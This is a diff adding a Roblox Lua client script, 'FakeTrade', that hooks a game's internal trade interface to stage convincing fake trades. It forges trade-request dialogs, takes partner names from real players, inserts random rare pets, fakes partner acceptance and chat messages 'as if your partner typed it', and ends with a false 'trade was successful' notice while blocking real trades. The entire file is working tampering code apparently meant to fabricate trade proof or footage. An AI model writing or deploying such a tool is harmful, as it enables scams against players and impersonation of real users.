+   local c = Instance.new("UICorner")
+   c.CornerRadius = UDim.new(0, 6)
+   c.Parent = b
+
+   spectatorButtons[i] = b
+   b.MouseButton1Click:Connect(function()
+       setMaxSpectators(i)
+   end)
+end
+
+------------------------
+-- Add / remove buttons
+------------------------
+local addButton = Instance.new("TextButton")
+addButton.Size = UDim2.new(1, -20, 0, 24)
+addButton.Position = UDim2.new(0, 10, 0, 86)
+addButton.BackgroundColor3 = Color3.fromRGB(235, 149, 84)
+addButton.BorderSizePixel = 0
+addButton.Font = Enum.Font.GothamBold
+addButton.TextSize = 12
+addButton.TextColor3 = Color3.new(1,1,1)
+addButton.Text = "add high tier pet"
+addButton.Parent = tradeContent
+
+local addCorner = Instance.new("UICorner")
+addCorner.CornerRadius = UDim.new(0, 8)
+addCorner.Parent = addButton
+
+local removeButton = Instance.new("TextButton")
+removeButton.Size = UDim2.new(1, -20, 0, 24)
+removeButton.Position = UDim2.new(0, 10, 0, 114)
+removeButton.BackgroundColor3 = Color3.fromRGB(220, 90, 90)
+removeButton.BorderSizePixel = 0
+removeButton.Font = Enum.Font.GothamBold
+removeButton.TextSize = 12
+removeButton.TextColor3 = Color3.new(1,1,1)
+removeButton.Text = "remove last pet"
+removeButton.Parent = tradeContent
+
+local removeCorner = Instance.new("UICorner")
+removeCorner.CornerRadius = UDim.new(0, 8)
+removeCorner.Parent = removeButton
+
+-- make partner accept button
+local forceAcceptButton = Instance.new("TextButton")
+forceAcceptButton.Size = UDim2.new(1, -20, 0, 24)
+forceAcceptButton.Position = UDim2.new(0, 10, 0, 142)
+forceAcceptButton.BackgroundColor3 = Color3.fromRGB(120, 140, 230)
+forceAcceptButton.BorderSizePixel = 0
+forceAcceptButton.Font = Enum.Font.GothamBold
+forceAcceptButton.TextSize = 12
+forceAcceptButton.TextColor3 = Color3.new(1, 1, 1)
+forceAcceptButton.Text = "make partner accept"
+forceAcceptButton.Parent = tradeContent
+
+local forceAcceptCorner = Instance.new("UICorner")
+forceAcceptCorner.CornerRadius = UDim.new(0, 8)
+forceAcceptCorner.Parent = forceAcceptButton
+
+-----------------------
+-- Player list + info --
+-----------------------
+local playerSection = Instance.new("Frame")
+playerSection.Size = UDim2.new(1, -20, 0, 150)
+playerSection.Position = UDim2.new(0, 10, 0, 178)
+playerSection.BackgroundColor3 = Color3.fromRGB(22, 24, 35)
+playerSection.BorderSizePixel = 0
+playerSection.Parent = tradeContent
+
+local playerCorner = Instance.new("UICorner")
+playerCorner.CornerRadius = UDim.new(0, 10)
+playerCorner.Parent = playerSection
+
+local playerTitle = Instance.new("TextLabel")
+playerTitle.Size = UDim2.new(1, -40, 0, 18)
+playerTitle.Position = UDim2.new(0, 10, 0, 6)
+playerTitle.BackgroundTransparency = 1
+playerTitle.Font = Enum.Font.GothamBold
+playerTitle.TextSize = 11
+playerTitle.TextColor3 = Color3.fromRGB(200, 205, 245)
+playerTitle.TextXAlignment = Enum.TextXAlignment.Left
+playerTitle.Text = "trade partner"
+playerTitle.Parent = playerSection
+
+local refreshButton = Instance.new("TextButton")
+refreshButton.Size = UDim2.new(0, 22, 0, 18)
+refreshButton.Position = UDim2.new(1, -26, 0, 6)
+refreshButton.BackgroundTransparency = 1
+refreshButton.Font = Enum.Font.GothamBold
+refreshButton.TextSize = 13
+refreshButton.TextColor3 = Color3.fromRGB(150, 160, 230)
+refreshButton.Text = "?"
+refreshButton.Parent = playerSection
+
+-- manual username box
+local nameBox = Instance.new("TextBox")
+nameBox.Size = UDim2.new(1, -14, 0, 20)
+nameBox.Position = UDim2.new(0, 7, 0, 26)
+nameBox.BackgroundColor3 = Color3.fromRGB(28, 30, 45)
+nameBox.BorderSizePixel = 0
+nameBox.Font = Enum.Font.Gotham
+nameBox.TextSize = 11
+nameBox.TextColor3 = Color3.fromRGB(220, 225, 255)
+nameBox.PlaceholderText = "type username + press Enter"
+nameBox.PlaceholderColor3 = Color3.fromRGB(120, 125, 175)
+nameBox.ClearTextOnFocus = false
+nameBox.Text = ""
+nameBox.Parent = playerSection
+
+local nameBoxCorner = Instance.new("UICorner")
+nameBoxCorner.CornerRadius = UDim.new(0, 6)
+nameBoxCorner.Parent = nameBox
+
+local playerList = Instance.new("ScrollingFrame")
+playerList.Size = UDim2.new(1, -14, 1, -54)
+playerList.Position = UDim2.new(0, 7, 0, 48)
+playerList.BackgroundColor3 = Color3.fromRGB(18, 20, 32)
+playerList.BorderSizePixel = 0
+playerList.ScrollBarThickness = 4
+playerList.CanvasSize = UDim2.new()
+playerList.Parent = playerSection
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.Padding = UDim.new(0, 3)
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listLayout.Parent = playerList
+
+local selectedNameLabel = Instance.new("TextLabel")
+selectedNameLabel.Size = UDim2.new(1, -20, 0, 16)
+selectedNameLabel.Position = UDim2.new(0, 10, 1, -26)
+selectedNameLabel.BackgroundTransparency = 1
+selectedNameLabel.Font = Enum.Font.Gotham
+selectedNameLabel.TextSize = 11
+selectedNameLabel.TextColor3 = Color3.fromRGB(210, 215, 255)
+selectedNameLabel.TextXAlignment = Enum.TextXAlignment.Left
+selectedNameLabel.Text = currentTargetDisplayName
+selectedNameLabel.Parent = tradeContent
+
+local selectedIdLabel = Instance.new("TextLabel")
+selectedIdLabel.Size = UDim2.new(1, -20, 0, 14)
+selectedIdLabel.Position = UDim2.new(0, 10, 1, -12)
+selectedIdLabel.BackgroundTransparency = 1
+selectedIdLabel.Font = Enum.Font.Gotham
+selectedIdLabel.TextSize = 10
+selectedIdLabel.TextColor3 = Color3.fromRGB(150, 155, 205)
+selectedIdLabel.TextXAlignment = Enum.TextXAlignment.Left
+selectedIdLabel.Text = "ID: visual_only"
+selectedIdLabel.Visible = false
+selectedIdLabel.Parent = tradeContent
+
+-------------------------------------------------
+-- Player list helper + auto-refresh           --
+-------------------------------------------------
+local function setCurrentTarget(displayName, id)
+   currentTargetDisplayName = displayName
+   currentTargetName        = displayName
+   currentTargetId          = id or 0
+
+   selectedNameLabel.Text = currentTargetDisplayName
+   if currentTargetId ~= 0 then
+       selectedIdLabel.Text = "ID: "..tostring(currentTargetId)
+   else
+       selectedIdLabel.Text = "ID: visual_only"
+   end
+end
+
+   setIdleStatus() -- keeps header in sync with whoever is selected
+
+local function getUserIdFromName(name)
+   if cachedUserIds[name] ~= nil then
+       return cachedUserIds[name]
+   end
+   local id = 0
+   local ok, result = pcall(function()
+       return Players:GetUserIdFromNameAsync(name)
+   end)
+   if ok then
+       id = result
+   end
+   cachedUserIds[name] = id
+   return id
+end
+
+local function createPlayerButton(displayName, userId, isStatic, layoutOrder)
+   local b = Instance.new("TextButton")
+   b.Name = displayName
+   b.Size = UDim2.new(1, 0, 0, 22)
+   b.BorderSizePixel = 0
+   b.Font = Enum.Font.Gotham
+   b.TextSize = 11
+   b.TextXAlignment = Enum.TextXAlignment.Left
+   b.Text = "  " .. displayName
+   b.LayoutOrder = layoutOrder or 0
+
+   if isStatic then
+       b.BackgroundColor3 = Color3.fromRGB(185, 205, 255)
+       b.TextColor3 = Color3.fromRGB(25, 35, 60)
+   else
+       b.BackgroundColor3 = Color3.fromRGB(34, 36, 52)
+       b.TextColor3 = Color3.fromRGB(225, 230, 255)
+   end
+
+   b.Parent = playerList
+
+   local c = Instance.new("UICorner")
+   c.CornerRadius = UDim.new(0, 6)
+   c.Parent = b
+
+   b.MouseButton1Click:Connect(function()
+       setCurrentTarget(displayName, userId)
+       print("[FakeTrade] selected partner:", displayName, "(ID:", userId, ")")
+   end)
+end
+
+local function rebuildPlayerList()
+   for _, child in ipairs(playerList:GetChildren()) do
+       if child:IsA("TextButton") then
+           child:Destroy()
+       end
+   end
+
+   local usedReal = {}
+   local order = 0
+
+   -- static names first
+   for _, name in ipairs(STATIC_PLAYER_NAMES) do
+       local plr = Players:FindFirstChild(name)
+       if plr and plr ~= LocalPlayer then
+           usedReal[plr] = true
+           createPlayerButton(plr.Name, plr.UserId, false, order)
+       else
+           local uid = getUserIdFromName(name)
+           createPlayerButton(name, uid, true, order)
+       end
+       order += 1
+   end
+
+   -- all other real players
+   local realOrder = 100
+   for _, plr in ipairs(Players:GetPlayers()) do
+       if plr ~= LocalPlayer and not usedReal[plr] and not table.find(STATIC_PLAYER_NAMES, plr.Name) then
+           createPlayerButton(plr.Name, plr.UserId, false, realOrder)
+           realOrder += 1
+       end
+   end
+
+   playerList.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y)
+end
+
+refreshButton.MouseButton1Click:Connect(rebuildPlayerList)
+Players.PlayerAdded:Connect(rebuildPlayerList)
+Players.PlayerRemoving:Connect(rebuildPlayerList)
+rebuildPlayerList()
+
+-- manual username entry (preserves your casing for display)
+nameBox.FocusLost:Connect(function(enterPressed)
+   if not enterPressed then return end
+   local text = nameBox.Text or ""
+   text = text:gsub("^%s+", ""):gsub("%s+$", "")
+   if text == "" then return end
+
+   local typedDisplay = text
+   local lookupName   = text
+   local chosenId     = 0
+
+   for _, plr in ipairs(Players:GetPlayers()) do
+       if plr.Name:lower() == text:lower() then
+           lookupName = plr.Name
+           chosenId   = plr.UserId
+           break
+       end
+   end
+
+   if chosenId == 0 then
+       chosenId = getUserIdFromName(lookupName)
+   end
+
+   setCurrentTarget(typedDisplay, chosenId)
+   print("[FakeTrade] manual partner set to:", typedDisplay, "(ID:", chosenId, ")")
+end)
+
+-------------------------------------------------
+-- Random spectator loop (changes over time)   --
+-------------------------------------------------
+local function startSpectatorLoop()
+   if spectatorLoopRunning then return end
+   spectatorLoopRunning = true
+
+   task.spawn(function()
+       while spectatorLoopRunning and fakeActive do
+           task.wait(math.random(7, 13))
+           if not fakeActive then break end
+           local newCount = math.random(1, math.max(1, desiredMaxSpectators))
+           local s = getLocalState()
+           if s and s.trade_id == fakeTradeId then
+               allowOverwrite = true
+               s.subscriber_count = newCount
+               TradeApp:_overwrite_local_trade_state(s)
+               allowOverwrite = false
+               TradeApp:refresh_all()
+           end
+       end
+       spectatorLoopRunning = false
+   end)
+end
+
+   setInTradeStatus()
+
+local function stopSpectatorLoop()
+   spectatorLoopRunning = false
+end
+
+-----------------------------
+-- Timeout safety (60 sec) --
+-----------------------------
+local function restoreHooks()
+   TradeApp._on_accept_pressed           = originalAccept
+   TradeApp._on_confirm_pressed          = originalConfirm
+   TradeApp._overwrite_local_trade_state = originalOverwrite
+   TradeApp._remove_item_from_my_offer   = originalRemove
+
+   -- fully unlock the game when fake trade ends
+   blockRealTrades = false
+   stopBlockingRealRequests()
+   stopSpectatorLoop()
+   stopNameFix()
+end
+
+
+
+---------------------------------------------
+-- Shared helper: remove last from a side  --
+---------------------------------------------
+local function removeLastFromOffer(sideKey)
+   local s = getLocalState()
+   if not s or s.trade_id ~= fakeTradeId then return nil, nil end
+   local offer = s[sideKey]
+   if not offer or not offer.items or #offer.items == 0 then return nil, nil end
+
+   local removed = table.remove(offer.items)
+
+   allowOverwrite = true
+   TradeApp:_overwrite_local_trade_state(s)
+   allowOverwrite = false
+   TradeApp:_lock_trade_for_appropriate_time()
+   tradeUnlockAt = os.clock() + LOCK_DURATION
+   TradeApp:refresh_all()
+
+   return removed, sideKey
+end
+
+---------------------------------------------
+-- Force partner accept helper             --
+---------------------------------------------
+local function forcePartnerAccept()
+   -- still respect the 5s lock: can't force-accept while locked
+   if os.clock() < tradeUnlockAt then
+       warn("[FakeTrade] trade is currently locked - wait for the timer to finish")
+       return
+   end
+
+   local s = getLocalState()
+   if not s or s.trade_id ~= fakeTradeId then
+       warn("[FakeTrade] no active visual trade - can't force accept")
+       return
+   end
+
+   -- make it LOOK like partner clicked Accept,
+   -- but do NOT bump offer_version or re-lock timer
+   s.recipient_offer.negotiated  = true
+   s.recipient_offer.confirmed   = false
+   s.recipient_offer.player_name = currentTargetDisplayName
+   -- ? don't touch s.offer_version here
+
+   allowOverwrite = true
+   TradeApp:_overwrite_local_trade_state(s)
+   allowOverwrite = false
+   TradeApp:refresh_all()
+
+   
+
+   TradeApp:_render_message_in_trade_chat(
+       nil,
+       string.format("%s accepted the trade", currentTargetDisplayName),
+       false,
+       true
+   )
+
+   print("[FakeTrade] forced partner accept (no extra lock)")
+end
+
+---------------------------------------------
+-- Wrap TradeApp to control fake trades    --
+---------------------------------------------
+local function enableFakeTradeHooks()
+   fakeActive = true
+   startNameFix()
+
+   TradeApp._overwrite_local_trade_state = function(self, trade, ...)
+       if trade == nil and fakeActive and not allowOverwrite then
+           print("[FakeTrade] trade state cleared externally - resetting hooks")
+           fakeActive = false
+           fakeTradeId = nil
+           stopSpectatorLoop()
+           restoreHooks()
+           return originalOverwrite(self, trade, ...)
+       end
+
+       if not fakeActive or allowOverwrite then
+           local result = originalOverwrite(self, trade, ...)
+           return result
+       end
+
+       if trade == nil then
+           fakeActive = false
+           fakeTradeId = nil
+           stopSpectatorLoop()
+           restoreHooks()
+           local result = originalOverwrite(self, trade, ...)
+           return result
+       end
+
+       if trade and trade.trade_id and trade.trade_id ~= fakeTradeId then
+           print("[FakeTrade] blocked real trade overwrite while visual trade active")
+           return
+       end
+
+       local result = originalOverwrite(self, trade, ...)
+       return result
+   end
+
+   TradeApp._remove_item_from_my_offer = function(self, item)
+       local s = getLocalState()
+       if not fakeActive or not s or s.trade_id ~= fakeTradeId or not item or not item.unique then
+           return originalRemove(self, item)
+       end
+
+       local removedItem, removedSide
+
+       local function trySide(key)
+           local offer = s[key]
+           if not offer or not offer.items then return false end
+           for i, v in ipairs(offer.items) do
+               if v.unique == item.unique then
+                   removedItem = v
+                   removedSide = key
+                   table.remove(offer.items, i)
+                   return true
+               end
+           end
+           return false
+       end
+
+       if not trySide("recipient_offer") and not trySide("sender_offer") then
+           return originalRemove(self, item)
+       end
+
+allowOverwrite = true
+TradeApp:_overwrite_local_trade_state(s)
+allowOverwrite = false
+
+-- game's lock + our local 5s lock
+TradeApp:_lock_trade_for_appropriate_time()
+tradeUnlockAt = os.clock() + LOCK_DURATION
+
+TradeApp:refresh_all()
+
+       if removedItem then
+           local tag = removedItem.properties and tagForProps(removedItem.properties) or "FR"
+           local nice = removedItem.kind and formatPetName(removedItem.kind) or "Pet"
+           local who  = (removedSide == "sender_offer") and LocalPlayer.Name or currentTargetDisplayName
+
+           self:_render_message_in_trade_chat(
+               nil,
+               string.format("%s removed %s %s", who, tag, nice),
+               false,
+               true
+           )
+
+           print(string.format(
+               "[FakeTrade] removed %s %s from %s offer (5-second lock)",
+               tag,
+               removedItem.kind or "?",
+               who
+           ))
+       end
+   end
+
+   TradeApp._on_accept_pressed = function(self, ...)
+   local s = self:_get_local_trade_state()
+   if not fakeActive or not s or s.trade_id ~= fakeTradeId then
+       return originalAccept(self, ...)
+   end
+
+   -- ? respect the 5s lock on YOUR side too
+   if os.clock() < tradeUnlockAt then
+       local remaining = math.max(0, tradeUnlockAt - os.clock())
+       warn(("[FakeTrade] your side is locked for %.1fs more - can't Accept yet"):format(remaining))
+       return
+   end
+
+   print("[FakeTrade] you clicked Accept")
+
+       s.sender_offer.negotiated   = true
+       s.sender_offer.confirmed    = false
+       s.sender_offer.player_name  = LocalPlayer.Name
+
+       if s.recipient_offer and s.recipient_offer.negotiated then
+           s.current_stage = "confirmation"
+           s.offer_version = (s.offer_version or 1) + 1
+
+           allowOverwrite = true
+           TradeApp:_overwrite_local_trade_state(s)
+           allowOverwrite = false
+           TradeApp:refresh_all()
+
+           print("[FakeTrade] both accepted - now in confirmation stage (manual partner accept)")
+           return
+       end
+
+       allowOverwrite = true
+       TradeApp:_overwrite_local_trade_state(s)
+       allowOverwrite = false
+       TradeApp:refresh_all()
+
+       print("[FakeTrade] auto-accepting partner in 2 seconds...")
+       task.delay(2, function()
+           local s2 = getLocalState()
+           if not fakeActive or not s2 or s2.trade_id ~= fakeTradeId then return end
+
+           s2.recipient_offer.negotiated  = true
+           s2.recipient_offer.confirmed   = false
+           s2.recipient_offer.player_name = currentTargetDisplayName
+           s2.current_stage               = "confirmation"
+           s2.offer_version               = (s2.offer_version or 1) + 1
+
+           allowOverwrite = true
+           TradeApp:_overwrite_local_trade_state(s2)
+           allowOverwrite = false
+           TradeApp:refresh_all()
+
+           print("[FakeTrade] both accepted - now in confirmation stage (auto partner)")
+       end)
+   end
+
+   TradeApp._on_confirm_pressed = function(self, ...)
+       local s = self:_get_local_trade_state()
+       if not fakeActive or not s or s.trade_id ~= fakeTradeId then
+           return originalConfirm(self, ...)
+       end
+
+       print("[FakeTrade] you clicked Confirm")
+
+       s.sender_offer.negotiated  = true
+       s.sender_offer.confirmed   = true
+       s.sender_offer.player_name = LocalPlayer.Name
+
+       allowOverwrite = true
+       TradeApp:_overwrite_local_trade_state(s)
+       allowOverwrite = false
+       TradeApp:refresh_all()
+
+       print("[FakeTrade] auto-confirming partner in 2 seconds...")
+       task.delay(2, function()
+           local s2 = getLocalState()
+           if not s2 or not fakeActive or s2.trade_id ~= fakeTradeId then return end
+
+           s2.recipient_offer.negotiated  = true
+           s2.recipient_offer.confirmed   = true
+           s2.recipient_offer.player_name = currentTargetDisplayName
+
+           allowOverwrite = true
+           TradeApp:_overwrite_local_trade_state(s2)
+           allowOverwrite = false
+           TradeApp:refresh_all()
+
+           print("[FakeTrade] both confirmed - finishing trade...")
+
+           task.delay(2, function()
+               pcall(function()
+                   if self.frame and self.frame.Parent then
+                       self.frame:Destroy()
+                   end
+                   self:hide()
+                   allowOverwrite = true
+                   self:_overwrite_local_trade_state(nil)
+                   allowOverwrite = false
+               end)
+
+               fakeActive = false
+               fakeTradeId = nil
+               stopSpectatorLoop()
+               restoreHooks()
+
+               UIManager.apps.HintApp:hint({
+                   text = "The trade was successful!";
+                   length = 3;
+                   overridable = true;
+               })
+
+               print("[FakeTrade] Trade finished.")
+               setIdleStatus()
+
+           end)
+       end)
+   end
+end
+
+---------------------------------------
+-- Add / remove partner-side items   --
+---------------------------------------
+local function addPetToPartner()
+   local s = getLocalState()
+   if not s or s.trade_id ~= fakeTradeId then
+       warn("[FakeTrade] no active visual trade - start one first")
+       return
+   end
+
+   local offer = s.recipient_offer
+   if not offer then
+       warn("[FakeTrade] recipient_offer missing in state")
+       return
+   end
+
+   local petKind = PET_KINDS[math.random(1, #PET_KINDS)]
+   local propsDef = RARITY_PROPS[math.random(1, #RARITY_PROPS)]
+   local props = {
+       mega_neon = propsDef.mega_neon;
+       neon      = propsDef.neon;
+       flyable   = propsDef.flyable;
+       rideable  = propsDef.rideable;
+   }
+
+   offer.items = offer.items or {}
+   local newItem = {
+       unique     = "pet_" .. petKind .. "_" .. math.random(10000, 99999),
+       category   = "pets",
+       kind       = petKind,
+       properties = props,
+   }
+   table.insert(offer.items, newItem)
+
+       allowOverwrite = true
+   TradeApp:_overwrite_local_trade_state(s)
+   allowOverwrite = false
+   TradeApp:_lock_trade_for_appropriate_time()
+   tradeUnlockAt = os.clock() + LOCK_DURATION
+   TradeApp:refresh_all()
+
+   local tag = tagForProps(props)
+   local niceName = formatPetName(petKind)
+   TradeApp:_render_message_in_trade_chat(nil,
+       string.format("%s added %s %s", currentTargetDisplayName, tag, niceName),
+       false, true
+   )
+
+   print(string.format("[FakeTrade] added %s %s to partner offer (5-second lock)", tag, petKind))
+end
+
+local function removePetFromPartner()
+   local removed = select(1, removeLastFromOffer("recipient_offer"))
+   if not removed then
+       print("[FakeTrade] no pets to remove from partner")
+       return
+   end
+
+   local tag = removed.properties and tagForProps(removed.properties) or "FR"
+   local niceName = removed.kind and formatPetName(removed.kind) or "Pet"
+   TradeApp:_render_message_in_trade_chat(nil,
+       string.format("%s removed %s %s", currentTargetDisplayName, tag, niceName),
+       false, true
+   )
+   print(string.format("[FakeTrade] removed %s %s from partner offer (5-second lock)", tag, removed.kind or "?"))
+end
+
+addButton.MouseButton1Click:Connect(addPetToPartner)
+removeButton.MouseButton1Click:Connect(removePetFromPartner)
+forceAcceptButton.MouseButton1Click:Connect(forcePartnerAccept)
+
+---------------------------
+-- Start visual trade    --
+---------------------------
+local function startVisualTrade()
+   if fakeActive then
+       local s = getLocalState()
+       if not s or s.trade_id ~= fakeTradeId then
+           warn("[FakeTrade] stale visual trade state detected - resetting.")
+           fakeActive = false
+           fakeTradeId = nil
+           stopSpectatorLoop()
+           restoreHooks()
+       else
+           warn("[FakeTrade] visual trade already running")
+           return
+       end
+   end
+
+   -- reset local lock when starting a brand new visual trade
+   tradeUnlockAt = 0
+
+   local targetPlayer = nil
+   if currentTargetId and currentTargetId ~= 0 then
+       targetPlayer = Players:GetPlayerByUserId(currentTargetId)
+   end
+   if not targetPlayer and currentTargetName then
+       targetPlayer = Players:FindFirstChild(currentTargetName)
+   end
+   if targetPlayer == LocalPlayer then
+       targetPlayer = nil
+   end
+
+   if targetPlayer then
+       currentTargetName = targetPlayer.Name
+       currentTargetId   = targetPlayer.UserId
+       currentTargetDisplayName = targetPlayer.Name
+       selectedNameLabel.Text = currentTargetDisplayName
+   end
+
+   local target
+   if targetPlayer then
+       target = targetPlayer
+   else
+       target = {
+           Name        = currentTargetName,
+           UserId      = currentTargetId or 0,
+           DisplayName = currentTargetDisplayName,
+       }
+   end
+
+   -- use the game's dialog exactly like before
+       local dlg = {
+       text  = string.format("%s sent you a trade request", currentTargetDisplayName),
+       left  = "Decline",
+       right = "Accept",
+   }
+
+   -- allow ONLY this dialog through the wrapper
+   allowMockDialog = true
+   local response = UIManager.apps.DialogApp:dialog(dlg)
+   allowMockDialog = false
+
+   print("[FakeTrade] trade request response:", response)
+
+   if response ~= "Accept" then
+       print("[FakeTrade] trade declined")
+       return
+   end
+
+blockRealTrades = true
+
+   fakeTradeId = "visual_trade_" .. math.random(10000, 99999)
+
+   local state = {
+       trade_id  = fakeTradeId,
+       sender    = LocalPlayer,
+       recipient = target,
+   }
+
+   state.sender_offer = {
+       items       = {},
+       negotiated  = false,
+       confirmed   = false,
+       player_name = LocalPlayer.Name,
+   }
+
+   state.recipient_offer = {
+       items       = {},
+       negotiated  = false,
+       confirmed   = false,
+       player_name = currentTargetDisplayName,
+   }
+
+   state.current_stage               = "negotiation"
+   state.offer_version               = 1
+   state.sender_has_trade_license    = true
+   state.recipient_has_trade_license = true
+   state.busy_indicators             = {}
+   state.subscriber_count            = 1
+
+   print(string.format("[FakeTrade] setting up empty visual trade with %d max spectators...", desiredMaxSpectators))
+   print(string.format("[FakeTrade] trading with: %s (ID: %d)", currentTargetDisplayName, currentTargetId))
+
+   enableFakeTradeHooks()
+   startBlockingRealRequests()
+
+   allowOverwrite = true
+   TradeApp:_overwrite_local_trade_state(state)
+   allowOverwrite = false
+
+   UIManager.set_app_visibility("TradeApp", true)
+   task.wait(0.4)
+   TradeApp:refresh_all()
+
+   startSpectatorLoop()
+
+   print("[FakeTrade] trade window opened")
+end
+
+startButton.MouseButton1Click:Connect(startVisualTrade)
+
+--------------------------------
+-- Intro -> panel transition  --
+--------------------------------
+local function showMainPanel()
+   -- let the tab system handle which page is visible
+   selectTab("trade")  -- was "main"
+
+   mainFrame.Visible = true
+   mainFrame.Position = UDim2.new(0, -210, 0, 100)
+
+   local tween = TweenService:Create(
+       mainFrame,
+       TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+       { Position = UDim2.new(0, 10, 0, 100) }
+   )
+   tween:Play()
+
+   local introTween = TweenService:Create(
+       introFrame,
+       TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+       { BackgroundTransparency = 1 }
+   )
+   introTween:Play()
+
+   task.delay(0.25, function()
+       introFrame:Destroy()
+   end)
+end
+
+introButton.MouseButton1Click:Connect(showMainPanel)
+
+----------------------------------------
+-- Chat tab: premade partner messages --
+----------------------------------------
+local chatCard = Instance.new("Frame")
+chatCard.Size = UDim2.new(1, -20, 1, -20)
+chatCard.Position = UDim2.new(0, 10, 0, 10)
+chatCard.BackgroundColor3 = Color3.fromRGB(22, 24, 36)
+chatCard.BorderSizePixel = 0
+chatCard.Parent = chatContent
+
+local chatCardCorner = Instance.new("UICorner")
+chatCardCorner.CornerRadius = UDim.new(0, 10)
+chatCardCorner.Parent = chatCard
+
+local chatTitle = Instance.new("TextLabel")
+chatTitle.Size = UDim2.new(1, -16, 0, 20)
+chatTitle.Position = UDim2.new(0, 8, 0, 6)
+chatTitle.BackgroundTransparency = 1
+chatTitle.Font = Enum.Font.GothamBold
+chatTitle.TextSize = 12
+chatTitle.TextColor3 = Color3.fromRGB(210, 215, 255)
+chatTitle.TextXAlignment = Enum.TextXAlignment.Left
+chatTitle.Text = "partner quick chat"
+chatTitle.Parent = chatCard
+
+local chatSub = Instance.new("TextLabel")
+chatSub.Size = UDim2.new(1, -16, 0, 16)
+chatSub.Position = UDim2.new(0, 8, 0, 24)
+chatSub.BackgroundTransparency = 1
+chatSub.Font = Enum.Font.Gotham
+chatSub.TextSize = 10
+chatSub.TextColor3 = Color3.fromRGB(160, 168, 220)
+chatSub.TextXAlignment = Enum.TextXAlignment.Left
+chatSub.Text = "click to send as if your partner typed it"
+chatSub.Parent = chatCard
+
+local chatList = Instance.new("ScrollingFrame")
+chatList.Size = UDim2.new(1, -16, 1, -48)
+chatList.Position = UDim2.new(0, 8, 0, 40)
+chatList.BackgroundColor3 = Color3.fromRGB(18, 20, 30)
+chatList.BorderSizePixel = 0
+chatList.ScrollBarThickness = 4
+chatList.CanvasSize = UDim2.new()
+chatList.Parent = chatCard
+
+local chatLayout = Instance.new("UIListLayout")
+chatLayout.Padding = UDim.new(0, 4)
+chatLayout.SortOrder = Enum.SortOrder.LayoutOrder
+chatLayout.Parent = chatList
+
+for _, msg in ipairs(CHAT_PRESETS) do
+   local btn = Instance.new("TextButton")
+   btn.Size = UDim2.new(1, 0, 0, 24)
+   btn.BackgroundColor3 = Color3.fromRGB(32, 35, 52)
+   btn.BorderSizePixel = 0
+   btn.Font = Enum.Font.Gotham
+   btn.TextSize = 11
+   btn.TextXAlignment = Enum.TextXAlignment.Left
+   btn.TextColor3 = Color3.fromRGB(220, 225, 255)
+   btn.Text = "  " .. msg
+   btn.Parent = chatList
+
+   local bc = Instance.new("UICorner")
+   bc.CornerRadius = UDim.new(0, 6)
+   bc.Parent = btn
+
+   btn.MouseButton1Click:Connect(function()
+       local state = getLocalState()
+       if not state then
+           warn("[FakeTrade] no open trade - quick chat ignored")
+           return
+       end
+
+       local senderRef = state.recipient
+       if not senderRef or type(senderRef) ~= "table" then
+           senderRef = {
+               Name        = currentTargetName,
+               UserId      = currentTargetId or 0,
+               DisplayName = currentTargetDisplayName,
+           }
+       end
+
+       TradeApp:_render_message_in_trade_chat(
+           senderRef,
+           msg,
+           false,
+           false
+       )
+
+       print("[FakeTrade] partner quick-chat ->", currentTargetDisplayName, ":", msg)
+   end)
+end
+
+chatList.CanvasSize = UDim2.new(0, 0, 0, chatLayout.AbsoluteContentSize.Y)
+
+print("[FakeTrade] Visual Trade Tool loaded.")
+print("  - choose a partner (list or textbox), then click 'start visual trade'.")
+print("  - capitalization of the partner name in the trade window now follows whatever you type/click.")
+
